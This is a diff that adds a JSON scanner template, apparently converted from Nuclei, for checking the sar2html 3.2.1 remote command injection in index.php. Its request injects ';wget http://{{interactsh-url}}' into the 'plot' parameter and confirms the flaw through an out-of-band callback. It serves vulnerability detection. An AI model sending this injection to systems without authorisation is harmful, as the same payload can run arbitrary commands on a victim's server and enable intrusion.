@@ -1,0 +1,125 @@
+{
+  "id": "sar2html-rce",
+  "name": "sar2html 3.2.1 - Remote Command Injection",
+  "author": "gy741",
+  "severity": "CRITICAL",
+  "description": "SAR2HTML could allow a remote attacker to execute arbitrary commands on the system via a command injection flaw in the index.php script. By sending specially-crafted commands, an attacker could exploit this vulnerability to execute arbitrary commands on the system.\n",
+  "references": [
+    "https://www.exploit-db.com/exploits/49344"
+  ],
+  "tags": [
+    "sar2html",
+    "rce",
+    "oast",
+    "edb"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-77",
+  "cvssScore": "10",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /index.php?plot\u003d;wget%20http://{{interactsh-url}} HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "interactsh_protocol",
+          "values": [
+            "http"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "sar2html-rce",
+    "info": {
+      "name": "sar2html 3.2.1 - Remote Command Injection",
+      "author": "gy741",
+      "severity": "critical",
+      "description": "SAR2HTML could allow a remote attacker to execute arbitrary commands on the system via a command injection flaw in the index.php script. By sending specially-crafted commands, an attacker could exploit this vulnerability to execute arbitrary commands on the system.\n",
+      "reference": [
+        "https://www.exploit-db.com/exploits/49344"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "cvss_score": "10",
+        "cwe_id": "CWE-77"
+      },
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "sar2html,rce,oast,edb"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /index.php?plot\u003d;wget%20http://{{interactsh-url}} HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n"
+        ],
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "interactsh_protocol",
+            "words": [
+              "http"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
